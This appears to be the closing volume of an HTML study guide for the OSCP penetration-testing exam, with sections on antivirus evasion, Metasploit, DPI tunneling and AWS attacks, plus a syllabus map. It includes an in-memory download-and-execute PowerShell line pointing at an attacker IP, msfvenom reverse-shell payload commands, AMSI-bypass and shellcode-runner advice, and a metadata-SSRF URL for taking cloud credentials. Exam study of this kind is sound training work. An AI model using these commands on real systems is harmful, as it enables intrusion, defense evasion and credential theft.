+<h1 id="v9-[av-evasion]-antivirus-evasion-module-15">[AV-EVASION]  Antivirus Evasion  (Module 15)<a class="anchor" href="#v9-[av-evasion]-antivirus-evasion-module-15">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> ⚠️ *Low for standard OSCP+ targets* (most exam boxes don&#x27;t run hardened Defender that eats everything), but <strong>Defender is sometimes on</strong>, so know the basics. <strong>Do not build a study plan around AV evasion.</strong> <code class="tag">[GENERAL]</code></p>
+<h2 id="v9-[av-concept]">[AV-CONCEPT]<a class="anchor" href="#v9-[av-concept]">#</a></h2>
+<p>Signature + heuristic + AMSI (script scanning) can flag your payloads. Options, cheapest first:</p>
+<ol>
+<li><strong>Use a different technique</strong> — a living-off-the-land command, a webshell, or creds+<code>evil-winrm</code> avoids dropping a flagged binary entirely.</li>
+<li><strong>Don&#x27;t touch disk</strong> — run PowerShell/C# <strong>in memory</strong> (download-and-exec, reflective load).</li>
+<li><strong>Obfuscate / re-encode</strong> the payload.</li>
+<li><strong>Compile your own</strong> loader (custom C#/C shellcode runner) — most reliable vs signatures.</li>
+</ol>
+<h2 id="v9-[av-practical]">[AV-PRACTICAL]<a class="anchor" href="#v9-[av-practical]">#</a></h2>
+<ul>
+<li><strong>msfvenom encoders are NOT AV evasion</strong> anymore (e.g., <code>shikata_ga_nai</code> is well-signatured). Don&#x27;t rely on <code>-e</code>/<code>-i</code>.</li>
+<li><strong>AMSI bypass</strong> (PowerShell script blocked): use a known AMSI-bypass one-liner before your script <code class="tag">[LOOK-UP]</code>, or run via a non-PowerShell vector. Patch/obfuscate approaches exist — verify current bypass, they change.</li>
+<li><strong>In-memory PS download-exec:</strong> <code>IEX (New-Object Net.WebClient).DownloadString(&#x27;http://$IP/x.ps1&#x27;)</code> (may still hit AMSI → bypass first).</li>
+<li><strong>Custom C# shellcode runner</strong> (compile with <code>csc.exe</code> / mono) that allocates memory + runs msfvenom raw shellcode — evades static sigs far better than a raw msfvenom exe.</li>
+<li><strong>Tools:</strong> Invoke-Obfuscation (PS), Shellter (PE injection), Veil (dated), custom loaders. <code class="tag">[LOOK-UP]</code></li>
+</ul>
+<p><strong>TROUBLESHOOT:</strong> payload deletes instantly → Defender real-time; try in-memory + obfuscation, or avoid the binary (use creds/webshell). Test detection with <code>AMSITrigger</code>/local Defender if available (don&#x27;t upload to VirusTotal — it distributes samples).</p>
+<hr>
+<h1 id="v9-[tool-msf]-the-metasploit-framework-module-21">[TOOL-MSF]  The Metasploit Framework  (Module 21)<a class="anchor" href="#v9-[tool-msf]-the-metasploit-framework-module-21">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> ✅ but <strong>restricted — ONE target only.</strong> Meterpreter/exploit/post modules count against your single allowed machine; <strong>no MSF for pivoting.</strong> Use it deliberately on your hardest box; <strong>do everything else manually.</strong> <code>[OFFICIAL OFFSEC]</code></p>
+<h2 id="v9-[msf-quick]">[MSF-QUICK]<a class="anchor" href="#v9-[msf-quick]">#</a></h2>
+<pre><code>msfconsole -q
+search &lt;product/cve&gt;
+use exploit/&lt;path&gt;
+show options ; set RHOSTS $T ; set LHOST tun0 ; set LPORT 443 ; set RPORT &lt;p&gt;
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit            # or: run
+sessions -l ; sessions -i 1 ; background       # (Ctrl+Z to background a session)</code></pre>
+<h2 id="v9-[msf-handler]-catch-a-manual-payload-multihandler">[MSF-HANDLER]  catch a manual payload (multi/handler)<a class="anchor" href="#v9-[msf-handler]-catch-a-manual-payload-multihandler">#</a></h2>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST tun0 ; set LPORT 443 ; exploit -j</code></pre>
+<h2 id="v9-[msf-msfvenom]-payload-generation-usable-broadly-for-shells">[MSF-MSFVENOM]  payload generation (usable broadly for shells)<a class="anchor" href="#v9-[msf-msfvenom]-payload-generation-usable-broadly-for-shells">#</a></h2>
+<pre><code># Windows exe / Linux elf / web / raw shellcode:
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IP LPORT=443 -f exe -o m.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o r.elf
+msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw -o sh.php
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o r.exe   # non-meterpreter stager (no MSF session needed to catch — use nc)</code></pre>
+<h2 id="v9-[msf-meterpreter]-common-commands">[MSF-METERPRETER]  common commands<a class="anchor" href="#v9-[msf-meterpreter]-common-commands">#</a></h2>
+<p><code>getuid</code>, <code>sysinfo</code>, <code>ps</code>, <code>migrate &lt;pid&gt;</code>, <code>hashdump</code>, <code>getsystem</code> (token), <code>upload/download</code>, <code>shell</code>, <code>background</code>, <code>run post/multi/recon/local_exploit_suggester</code> (privesc leads).</p>
+<p><strong>RULE:</strong> pick your ONE MSF box (often the hardest/most finicky exploit). Everywhere else: manual exploit + <code>nc</code>/manual shells (<code class="tag">[SHELL-QUICK]</code>). Never MSF-pivot on the exam.</p>
+<hr>
+<h1 id="v9-[dpi-tunneling]-tunneling-through-deep-packet-inspection-module-20-extends-[pivot-]">[DPI-TUNNELING]  Tunneling Through Deep Packet Inspection  (Module 20 — extends <code>[PIVOT-*]</code>)<a class="anchor" href="#v9-[dpi-tunneling]-tunneling-through-deep-packet-inspection-module-20-extends-[pivot-]">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> ⚠️ *Low–moderate.* Standard pivoting (<code class="tag">[PIVOT-QUICK]</code> Ligolo/Chisel/SSH) covers almost everything. This is for when normal ports/protocols are <strong>filtered by a firewall/proxy</strong>. <code class="tag">[GENERAL]</code></p>
+<ul>
+<li><strong>Chisel over HTTP/TLS</strong>: chisel already looks like HTTP(S); use common egress ports (80/443) if raw ports are blocked.</li>
+<li><strong>DNS tunneling (dnscat2 / iodine):</strong> when *only* DNS (53) leaves the network. Slow, last resort.</li>
+</ul>
+<p>  <code># server: dnscat2-server tunnel.domain ; client: ./dnscat2 tunnel.domain</code> <code class="tag">[LOOK-UP]</code></p>
+<ul>
+<li><strong>SSH over 443 / proxy:</strong> if only 443 egress → run SSH/chisel on 443; behind an HTTP proxy use <code>proxytunnel</code>/<code>corkscrew</code>.</li>
+<li><strong>Decision:</strong> try Ligolo/Chisel on 443 first; only reach for DNS tunneling if everything else is filtered.</li>
+</ul>
+<hr>
+<h1 id="v9-[cloud-aws]-aws-cloud-modules-2526-2931">[CLOUD-AWS]  AWS Cloud (Modules 25–26, 29–31)<a class="anchor" href="#v9-[cloud-aws]-aws-cloud-modules-2526-2931">#</a></h1>
+<p><strong>EXAM RELEVANCE:</strong> 🚫 <strong>NOT on the standard OSCP/OSCP+ exam.</strong> The exam is 3 standalones + 1 AD set. Cloud is <strong>course/&quot;Extra Mile&quot; content only</strong> — good general knowledge, but <strong>do not spend exam prep here.</strong> Skim it, move on. <code>[OFFICIAL OFFSEC]</code> (exam guide format) + <code class="tag">[COMMUNITY]</code></p>
+<h2 id="v9-[cloud-aws-quick]-awareness-level">[CLOUD-AWS-QUICK]  (awareness level)<a class="anchor" href="#v9-[cloud-aws-quick]-awareness-level">#</a></h2>
+<pre><code>aws configure                              # set found access key/secret/region
+aws sts get-caller-identity                # who am I (identity/account)
+aws s3 ls ; aws s3 ls s3://&lt;bucket&gt; --no-sign-request     # public bucket loot
+aws iam list-users ; aws iam list-attached-user-policies --user-name X
+aws ec2 describe-instances                 # find hosts/user-data (may hold secrets)
+aws secretsmanager list-secrets ; aws ssm get-parameters ...</code></pre>
+<ul>
+<li>**Metadata SSRF (this CAN appear via a web <code class="tag">[WEB-SSRF]</code> finding):** <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> → temporary AWS creds. This overlaps normal web exploitation — worth recognizing.</li>
+<li>Loot to hunt: S3 buckets (public/misconfigured), IAM over-permissive policies, EC2 user-data scripts, Secrets Manager/SSM parameters.</li>
+</ul>
+<p><strong>Bottom line for a beginner:</strong> learn the metadata-SSRF idea (it&#x27;s a web trick); skip deep AWS attack chains until after you pass.</p>
+<hr>
+<h1 id="v9-[syllabus-map]-pen-200-module-kb-coverage-full">[SYLLABUS-MAP]  PEN-200 module → KB coverage (full)<a class="anchor" href="#v9-[syllabus-map]-pen-200-module-kb-coverage-full">#</a></h1>
+<pre><code>1-6  Intro/Kali/CLI/Bash/Report/Info-Gathering → [BEGINNER-START-HERE], Vol1 [ENUM-*], Vol0 [REPORTING]
+7    Vulnerability Scanning        → [NMAP-SCRIPTS] [METHOD-7] (nikto); Nessus not needed for exam
+8    Intro Web App Attacks         → Vol2 [WEB-QUICK] [WEB-FINGERPRINT] [WEB-CONTENT]
+9    Common Web App Attacks        → Vol2 [WEB-*] (LFI/RFI/CMDINJ/SSRF/SSTI/XXE/UPLOAD/IDOR/JWT/AUTHBYPASS)
+10   SQL Injection Attacks         → Vol2 [SQLI-*] (mini-course, all DBs + sqlmap)
+11   Phishing Basics               → Vol7 [PHISHING] [CLIENTSIDE-NTLM-CAPTURE]
+12   Client-side Attacks           → Vol7 [CLIENTSIDE-*] (NTLM capture / macro / HTA / library)
+13   Locating Public Exploits      → Vol3 [EXPLOIT-RESEARCH]
+14   Fixing Exploits               → Vol7 [FIXING-EXPLOITS] (+ Vol3 [EXPLOIT-RESEARCH])
+15   Antivirus Evasion             → Vol7 [AV-EVASION]
+16   Password Attacks              → Vol3 [CREDENTIALS-*] [HASH-IDENTIFICATION] (hydra/hashcat/john)
+17   Windows Privilege Escalation  → Vol4 [WINDOWS-PRIVESC-*]
+18   Linux Privilege Escalation    → Vol4 [LINUX-PRIVESC-*]
+19   Port Redirection &amp; SSH Tunnel → Vol5 [PIVOT-SSH] [PIVOT-QUICK]
+20   Tunneling Through DPI         → Vol7 [DPI-TUNNELING] (+ Vol5 [PIVOT-*])
+21   The Metasploit Framework      → Vol7 [TOOL-MSF] (one-target rule)
+22   AD Introduction &amp; Enumeration → Vol5 [AD-ENUM] [AD-QUICK] [AD-BLOODHOUND]
+23   Attacking AD Authentication   → Vol5 [AD-KERBEROAST] [AD-ASREP] [AD-CREDENTIALS]
+24   Lateral Movement in AD        → Vol5 [AD-LATERAL] [AD-ACL] [AD-DCSYNC]
+25-26 AWS Cloud Enum/Attack        → Vol7 [CLOUD-AWS]  (NOT on exam — awareness only)
+27   Assembling the Pieces         → Vol5 [AD-ATTACK-PATH], Vol6 [CHAIN-*], Vol7 [EXAM-DAY-FLOW]
+28   Trying Harder: Challenge Labs → Vol0 [MINIMUM-VIABLE-PREP], [BEGINNER-START-HERE]
+29-31 Extra Mile: Cloud Labs       → Vol7 [CLOUD-AWS] (NOT on exam)</code></pre>
+<p><strong>Everything in the syllabus is now covered.</strong> Exam-critical (spend your time here): <strong>8–10 (web/SQLi), 13–14 &amp; 16 (exploits/passwords), 17–19 (privesc/pivot), 22–24 (AD), 27 (assembling).</strong> Light-touch: 11–12, 15, 20, 21. Skip-for-exam: 25–26, 29–31 (cloud).</p>
+<hr>
+<p>*End Volume 7. This completes the PEN-200 syllabus coverage.*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
